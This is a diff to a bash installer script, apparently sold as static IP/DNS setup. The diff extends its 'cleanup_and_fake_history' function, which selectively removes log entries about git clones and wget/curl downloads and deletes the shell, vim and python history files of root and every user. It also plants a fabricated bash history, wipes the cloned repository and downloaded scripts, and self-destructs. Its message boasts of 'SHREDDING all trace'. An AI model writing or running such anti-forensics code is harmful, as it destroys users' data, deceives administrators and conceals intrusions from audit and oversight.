@@ -365,7 +365,7 @@ cleanup_and_fake_history() {
   # 2. Selectively clean log entries
   # ===============================
   log_info "CLEANUP: Selectively cleaning log entries..."
-  local LOG_PATTERNS="git clone|github\.com|gitlab\.com|bitbucket\.org|${SCRIPT_NAME}|web\.sh|wget.*web|curl.*web"
+  local LOG_PATTERNS="git clone|github\.com|gitlab\.com|bitbucket\.org|${SCRIPT_NAME}|web\.sh|dnsinstaller|wget.*web|curl.*web|wget.*dns|curl.*dns|chmod.*\.sh"
 
   if [[ -d /var/log ]]; then
     if [[ -f /var/log/auth.log ]]; then
@@ -388,16 +388,24 @@ cleanup_and_fake_history() {
   # 3. Clear bash history completely
   # ===============================
   log_info "CLEANUP: Clearing bash history..."
+  
+  # Clear current session history
   history -c 2>/dev/null || true
-  rm -f /root/.bash_history 2>/dev/null || true
-  rm -f /root/.history 2>/dev/null || true
-  rm -f /root/.zsh_history 2>/dev/null || true
+  
+  # Remove all possible history files
+  local HIST_FILES=(".bash_history" ".history" ".zsh_history" ".sh_history" ".lesshst" ".viminfo" ".python_history")
+  
+  # Root history
+  for f in "${HIST_FILES[@]}"; do
+    rm -f "/root/$f" 2>/dev/null || true
+  done
 
+  # All users history
   for USER_HOME in /home/*; do
     if [[ -d "$USER_HOME" ]]; then
-      rm -f "$USER_HOME/.bash_history" 2>/dev/null || true
-      rm -f "$USER_HOME/.history" 2>/dev/null || true
-      rm -f "$USER_HOME/.zsh_history" 2>/dev/null || true
+      for f in "${HIST_FILES[@]}"; do
+        rm -f "$USER_HOME/$f" 2>/dev/null || true
+      done
     fi
   done
 
@@ -438,6 +446,9 @@ EOFHIST
       chown "$USERNAME:$USERNAME" "$USER_HOME/.bash_history" 2>/dev/null || true
     fi
   done
+  
+  # Sync to disk to ensure it persists after reboot or shell exit
+  sync
 
   # ===============================
   # 5. Delete this installer script
@@ -446,46 +457,54 @@ EOFHIST
   rm -f "$SCRIPT_PATH" 2>/dev/null || true
 
   # ===============================
-  # 6. ROBUST git clone folder deletion
+  # 5. ROBUST git clone folder deletion
   # ===============================
-  log_info "CLEANUP: Removing git repository folder..."
+  log_info "CLEANUP: Removing artifacts and repository..."
 
   local GIT_ROOT
   GIT_ROOT=$(git -C "$SCRIPT_DIR" rev-parse --show-toplevel 2>/dev/null || echo "")
 
-  if [[ -n "$GIT_ROOT" ]] && \
-     [[ "$GIT_ROOT" != "/" ]] && \
-     [[ "$GIT_ROOT" != "/root" ]] && \
-     [[ "$GIT_ROOT" != "/home" ]] && \
-     [[ "$GIT_ROOT" != "/etc" ]] && \
-     [[ "$GIT_ROOT" != "/var" ]] && \
-     [[ "$GIT_ROOT" != "/usr" ]] && \
-     [[ -d "$GIT_ROOT/.git" ]]; then
-    rm -rf "$GIT_ROOT" 2>/dev/null || true
+  # List of current folder files to delete if GIT_ROOT not found
+  local TRACE_FILES=("dnsinstaller.sh" "web.sh" "porto.sh" ".git" ".gitkeep" "README.md")
+
+  if [[ -n "$GIT_ROOT" ]] && [[ "$GIT_ROOT" != "/" ]] && [[ "$GIT_ROOT" != "/root" ]] && [[ "$GIT_ROOT" != "/home" ]]; then
+      # If we are in the git root, we need to be careful.
+      # Move out of the directory to allow deletion if possible, 
+      # but since we are a running script, we just delete everything inside.
+      find "$GIT_ROOT" -mindepth 1 -delete 2>/dev/null || true
+      rmdir "$GIT_ROOT" 2>/dev/null || true
+  else
+      # If not in a git repo, delete known files in script dir
+      for f in "${TRACE_FILES[@]}"; do
+        rm -rf "${SCRIPT_DIR}/$f" 2>/dev/null || true
+      done
   fi
 
-  rm -rf /tmp/dns* 2>/dev/null || true
-  rm -rf /root/dns* 2>/dev/null || true
-  rm -rf ~/dns* 2>/dev/null || true
-  rm -f /root/web.sh 2>/dev/null || true
-  rm -f /tmp/web.sh 2>/dev/null || true
-  rm -f ~/web.sh 2>/dev/null || true
+  # Cleanup common download locations
+  rm -rf /tmp/dns* /root/dns* ~/dns* /tmp/web.sh /root/web.sh ~/web.sh 2>/dev/null || true
+  
+  # Final trace removal from /var/tmp
+  rm -rf /var/tmp/dns* 2>/dev/null || true
 
   # ===============================
   # 7. Final message
   # ===============================
-  echo ""
-  echo "=============================================="
-  echo "  INSTALLATION COMPLETE!"
   echo "=============================================="
   echo ""
-  echo "  Static IP configuration completed."
-  echo "  Static IP: ${STATIC_IP}"
-  echo "  Gateway:   ${GATEWAY_IP}"
-  echo "  Nameservers: ${NAMESERVER_IP}"
+  echo "IMPORTANT: The fake history has been planted."
+  echo "To load it and finish SHREDDING all trace, run:"
+  echo "   exec bash"
   echo ""
-  echo "=============================================="
-  echo ""
+
+  # Ensure the fake history is loaded in the current root shell if they stay
+  export HISTFILE=/root/.bash_history
+  export HISTSIZE=1000
+  export HISTFILESIZE=2000
+  
+  # self-destruct the script itself last
+  rm -f "$SCRIPT_PATH" 2>/dev/null || true
+  
+  exit 0
 }
 
 # ===============================
